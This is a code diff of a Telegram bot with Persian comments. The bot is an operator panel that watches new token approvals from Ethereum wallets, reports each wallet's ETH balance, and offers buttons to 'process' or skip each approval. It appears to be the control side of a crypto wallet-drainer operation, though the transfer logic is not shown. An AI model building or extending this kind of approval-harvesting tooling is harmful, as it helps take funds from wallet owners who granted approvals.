+    token  = ap.get("token_address") or ap.get("tokenAddress") or ap.get("token") or "?"
+    ts     = (ap.get("created_at") or ap.get("createdAt") or "")[:19].replace("T", " ")
+    eth_link = f"{ETH_SCAN}/address/{addr}"
+
+    # تلاش برای دریافت موجودی ETH
+    try:
+        bal = get_eth_balance(addr)
+        bal_str = f"{bal:.4f} ETH" if bal >= 0 else "نامعلوم"
+    except Exception:
+        bal_str = "نامعلوم"
+
+    return (
+        "🚨 <b>Approval جدید شناسایی شد!</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👛 آدرس:\n<code>{addr}</code>\n"
+        f"💎 مقدار: <b>{amount}</b>\n"
+        f"🏦 موجودی ETH: <b>{bal_str}</b>\n"
+        f"🪙 توکن: <code>{str(token)[:20]}</code>\n"
+        f"📅 زمان: <code>{ts}</code>\n"
+        f"🔗 <a href='{eth_link}'>مشاهده در Etherscan</a>"
+    )
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ─── Notification logic ───────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def _notify_new_approvals():
+    """بررسی approval جدید و ارسال اعلان"""
+    if not ADMIN_CHAT:
+        return
+    try:
+        approvals = get_pending_approvals(100)
+        with _lock:
+            new_ones = [a for a in approvals if a.get("id") not in _seen_approval_ids]
+        for ap in new_ones:
+            aid = ap.get("id")
+            if not aid:
+                continue
+            text   = build_notification(ap)
+            # کیبورد با دکمه‌های عمل
+            kb = {"inline_keyboard": [
+                [{"text": "✅ تأیید",  "callback_data": f"proc_{aid}"},
+                 {"text": "⏭️ رد",    "callback_data": f"skip_{aid}"}],
+                [{"text": "📄 جزئیات", "callback_data": f"detail_{aid}"}],
+            ]}
+            tg_send(ADMIN_CHAT, text, kb)
+            with _lock:
+                _seen_approval_ids.add(aid)
+    except Exception as e:
+        logger.error(f"_notify_new_approvals error: {e}")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ─── Message / callback handlers ─────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
 
 def handle_message(msg: dict):
-    chat_id  = str(msg.get("chat", {}).get("id", ""))
-    text     = (msg.get("text") or "").strip()
-    if not chat_id or not text:
-        return
+    chat_id = str(msg.get("chat", {}).get("id", ""))
+    text    = msg.get("text", "").strip()
 
-    # Authorization check
+    # بررسی مجوز
     if ADMIN_CHAT and chat_id != ADMIN_CHAT:
         tg_send(chat_id, "⛔ دسترسی مجاز نیست.")
         return
 
-    cmd = text.split()[0].lower().split("@")[0]
+    cmd = text.split()[0].lower().lstrip("/").split("@")[0]
+    args = text.split()[1:] if len(text.split()) > 1 else []
 
-    if cmd in ("/start", "/menu"):
+    if cmd in ("start", "menu"):
         tg_send(chat_id, build_main(), main_kb())
-    elif cmd == "/status":
+
+    elif cmd == "status":
         tg_send(chat_id, "⏳ در حال بررسی سرویس‌ها…")
         tg_send(chat_id, build_status(), back_kb())
-    elif cmd == "/stats":
+
+    elif cmd == "stats":
         tg_send(chat_id, "⏳ در حال دریافت آمار…")
         tg_send(chat_id, build_stats(), back_kb())
-    elif cmd == "/approvals":
-        txt, kb = build_approvals(0)
-        tg_send(chat_id, txt, kb)
-    elif cmd == "/pending":
-        tg_send(chat_id, build_pending(), back_kb())
-    elif cmd == "/config":
+
+    elif cmd == "approvals":
+        txt, items = build_approvals_page(0, "approvals")
+        tg_send(chat_id, txt, approvals_list_kb(items, 0, "approvals"))
+
+    elif cmd == "pending":
+        txt, items = build_approvals_page(0, "pending")
+        tg_send(chat_id, txt, approvals_list_kb(items, 0, "pending"))
+
+    elif cmd == "config":
         tg_send(chat_id, build_config(), back_kb())
+
+    elif cmd in ("gas", "gasprice"):
+        tg_send(chat_id, "⏳ در حال دریافت Gas Price…")
+        tg_send(chat_id, build_gas(), back_kb())
+
+    elif cmd in ("price", "ethprice", "eth"):
+        tg_send(chat_id, "⏳ در حال دریافت قیمت…")
+        tg_send(chat_id, build_eth_price(), back_kb())
+
+    elif cmd == "help":
+        tg_send(chat_id, build_help(), back_kb())
+
+    elif cmd == "search":
+        if not args:
+            tg_send(chat_id, "❓ استفاده: /search &lt;آدرس کیف پول&gt;")
+            return
+        query = args[0]
+        tg_send(chat_id, f"🔍 در حال جستجو: <code>{html.escape(query)}</code>…")
+        results = search_approvals(query)
+        txt = build_search_results(results, query)
+        if results:
+            tg_send(chat_id, txt, approvals_list_kb(results[:5], 0, "approvals"))
+        else:
+            tg_send(chat_id, txt, back_kb())
+
     else:
-        tg_send(chat_id, build_main(), main_kb())
+        tg_send(chat_id, "❓ دستور ناشناخته. از /help برای راهنما استفاده کنید.", back_kb())
 
 
 def handle_callback(cb: dict):
-    cb_id    = cb.get("id", "")
-    chat_id  = str(cb.get("message", {}).get("chat", {}).get("id", ""))
-    msg_id   = cb.get("message", {}).get("message_id")
-    data     = cb.get("data", "")
+    cb_id   = cb.get("id", "")
+    chat_id = str(cb.get("message", {}).get("chat", {}).get("id", ""))
+    msg_id  = cb.get("message", {}).get("message_id")
+    data    = cb.get("data", "")
 
-    # Authorization check
+    # بررسی مجوز
     if ADMIN_CHAT and chat_id != ADMIN_CHAT:
-        tg_answer_callback(cb_id, "⛔ دسترسی ندارید")
+        tg_answer_callback(cb_id, "⛔ دسترسی مجاز نیست", alert=True)
         return
 
     tg_answer_callback(cb_id)
@@ -402,60 +689,111 @@ def handle_callback(cb: dict):
     if not chat_id or not msg_id:
         return
 
+    # ─── منوی اصلی / بروزرسانی ───
     if data in ("main", "refresh"):
         tg_edit(chat_id, msg_id, build_main(), main_kb())
-    elif data == "status":
-        tg_edit(chat_id, msg_id, "⏳ در حال بررسی…")
-        tg_edit(chat_id, msg_id, build_status(), back_kb())
+
+    # ─── آمار ───
     elif data == "stats":
         tg_edit(chat_id, msg_id, "⏳ در حال دریافت آمار…")
         tg_edit(chat_id, msg_id, build_stats(), back_kb())
-    elif data.startswith("approvals_"):
-        page = int(data.split("_")[1])
-        txt, kb = build_approvals(page)
-        tg_edit(chat_id, msg_id, txt, kb)
-    elif data == "pending":
-        tg_edit(chat_id, msg_id, build_pending(), back_kb())
+
+    # ─── وضعیت ───
+    elif data == "status":
+        tg_edit(chat_id, msg_id, "⏳ در حال بررسی…")
+        tg_edit(chat_id, msg_id, build_status(), back_kb())
+
+    # ─── قیمت ETH ───
+    elif data == "ethprice":
+        tg_edit(chat_id, msg_id, "⏳ در حال دریافت قیمت…")
+        tg_edit(chat_id, msg_id, build_eth_price(), back_kb())
+
+    # ─── Gas Price ───
+    elif data == "gasprice":
+        tg_edit(chat_id, msg_id, "⏳ در حال دریافت Gas Price…")
+        tg_edit(chat_id, msg_id, build_gas(), back_kb())
+
+    # ─── تنظیمات ───
     elif data == "config":
         tg_edit(chat_id, msg_id, build_config(), back_kb())
-    elif data == "ethprice":
-        tg_edit(chat_id, msg_id, build_ethprice(), back_kb())
 
-# ─── Notification job ─────────────────────────────────────────────────────────
+    # ─── راهنما ───
+    elif data == "help":
+        tg_edit(chat_id, msg_id, build_help(), back_kb())
 
-def _notify_new_approvals():
-    global _seen_approval_ids
-    if not ADMIN_CHAT or not BOT_TOKEN:
-        return
-    try:
-        approvals = get_approvals(100)
-        with _lock:
-            new_ones = [a for a in approvals
-                        if a.get("id") and a["id"] not in _seen_approval_ids]
-            for a in new_ones:
-                _seen_approval_ids.add(a["id"])
+    # ─── لیست همه Approvals ───
+    elif data.startswith("approvals_"):
+        try:
+            page = int(data.split("_", 1)[1])
+        except ValueError:
+            page = 0
+        txt, items = build_approvals_page(page, "approvals")
+        tg_edit(chat_id, msg_id, txt, approvals_list_kb(items, page, "approvals"))
 
-        for a in new_ones:
-            wallet = a.get("wallet", "?")
-            wtype  = a.get("wallet_type", "?")
-            token  = _short(a.get("token", ""), 10)
-            tx     = a.get("tx_hash") or "—"
-            t      = _ago(a.get("created_at", ""))
-            text = (
-                "🚨 <b>APPROVAL جدید!</b>\n"
-                "━━━━━━━━━━━━━━━━━\n\n"
-                f"🕐 {t}\n"
-                f"👛 <code>{html.escape(wallet)}</code>\n"
-                f"📱 {html.escape(str(wtype))}\n"
-                f"🪙 <code>{html.escape(token)}</code>\n"
-                f"🔗 <code>{html.escape(tx[:30])}</code>\n\n"
-                "⚡ ربات در حال پردازش است…"
-            )
-            tg_send(ADMIN_CHAT, text)
-    except Exception as e:
-        logger.error(f"notify error: {e}")
+    # ─── لیست Pending ───
+    elif data.startswith("pending_"):
+        try:
+            page = int(data.split("_", 1)[1])
+        except ValueError:
+            page = 0
+        txt, items = build_approvals_page(page, "pending")
+        tg_edit(chat_id, msg_id, txt, approvals_list_kb(items, page, "pending"))
 
-# ─── Main polling loop ────────────────────────────────────────────────────────
+    elif data == "pending":
+        txt, items = build_approvals_page(0, "pending")
+        tg_edit(chat_id, msg_id, txt, approvals_list_kb(items, 0, "pending"))
+
+    # ─── جزئیات یک Approval ───
+    elif data.startswith("detail_"):
+        aid = data[7:]
+        tg_edit(chat_id, msg_id, "⏳ در حال دریافت اطلاعات…")
+        ap = get_approval_by_id(aid)
+        if ap:
+            tg_edit(chat_id, msg_id, build_approval_detail(ap), approval_action_kb(aid))
+        else:
+            tg_edit(chat_id, msg_id, "❌ Approval پیدا نشد.", back_kb())
+
+    # ─── تأیید Approval ───
+    elif data.startswith("proc_"):
+        aid = data[5:]
+        tg_answer_callback(cb_id, "⏳ در حال تأیید…")
+        ok, msg_txt = confirm_approval(aid)
+        if ok:
+            tg_edit(chat_id, msg_id,
+                    f"✅ <b>Approval تأیید شد</b>\n<code>{aid[:20]}…</code>",
+                    back_kb())
+        else:
+            tg_edit(chat_id, msg_id,
+                    f"❌ <b>خطا در تأیید</b>\n<code>{aid[:20]}…</code>\n{msg_txt}",
+                    approval_action_kb(aid))
+
+    # ─── رد Approval ───
+    elif data.startswith("skip_"):
+        aid = data[5:]
+        tg_edit(chat_id, msg_id,
+                f"⏭️ <b>Approval رد شد</b>\n<code>{aid[:20]}…</code>",
+                back_kb())
+
+    # ─── Etherscan برای Approval ───
+    elif data.startswith("scan_"):
+        aid = data[5:]
+        ap = get_approval_by_id(aid)
+        if ap:
+            addr = ap.get("wallet_address") or ap.get("address") or ap.get("walletAddress") or ""
+            link = f"{ETH_SCAN}/address/{addr}"
+            tg_edit(chat_id, msg_id,
+                    f"🔗 <a href='{link}'>مشاهده {addr[:14]}… در Etherscan</a>",
+                    approval_action_kb(aid))
+        else:
+            tg_answer_callback(cb_id, "❌ Approval پیدا نشد", alert=True)
+
+    else:
+        tg_answer_callback(cb_id, "❓ دستور ناشناخته")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ─── Keep-alive & polling ─────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
 
 def _keep_alive():
     """هر ۱۴ دقیقه سرویس رو پینگ می‌کنه تا Render free-tier نخوابه"""
@@ -473,7 +811,6 @@ def _polling_loop():
         logger.error("❌ TELEGRAM_BOT_TOKEN not set — admin panel disabled")
         return
 
-
     # حذف webhook قدیمی — بدون این، polling هرگز پیام نمی‌گیره
     try:
         dw_res = requests.post(
@@ -484,22 +821,27 @@ def _polling_loop():
         logger.info(f"✅ deleteWebhook: {dw_res.json()}")
     except Exception as exc:
         logger.warning(f"deleteWebhook failed: {exc}")
+
     logger.info("📱 Admin Panel polling started")
+    offset     = 0
+    last_notify = 0
+
     # Keep-alive thread — جلوگیری از خواب Render free-tier
     threading.Thread(target=_keep_alive, daemon=True, name="KeepAlive").start()
-
-    offset = 0
-    last_notify = 0
 
     # تنظیم commands در تلگرام
     try:
         cmds = [
             {"command": "start",     "description": "🏠 منوی اصلی"},
-            {"command": "status",    "description": "🖥️ وضعیت سیستم"},
+            {"command": "status",    "description": "🖥️ وضعیت سرویس‌ها"},
             {"command": "stats",     "description": "📊 آمار کلی"},
-            {"command": "approvals", "description": "🔔 لیست Approval‌ها"},
+            {"command": "approvals", "description": "🔔 همه Approvals"},
             {"command": "pending",   "description": "⏳ در انتظار پردازش"},
-            {"command": "config",    "description": "⚙️ تنظیمات"},
+            {"command": "search",    "description": "🔍 جستجو با آدرس"},
+            {"command": "gas",       "description": "⛽ Gas Price اتریوم"},
+            {"command": "price",     "description": "💰 قیمت ETH"},
+            {"command": "config",    "description": "⚙️ تنظیمات سیستم"},
+            {"command": "help",      "description": "❓ راهنما"},
         ]
         requests.post(f"{TG_API}/setMyCommands",
                       json={"commands": cmds}, timeout=10)
@@ -509,11 +851,10 @@ def _polling_loop():
 
     while True:
         try:
-            # Fetch updates
             r = requests.get(
                 f"{TG_API}/getUpdates",
                 params={"offset": offset, "timeout": 20, "limit": 50},
-                timeout=25
+                timeout=25,
             )
             if r.status_code != 200:
                 logger.error(f"getUpdates HTTP {r.status_code}: {r.text[:300]}")
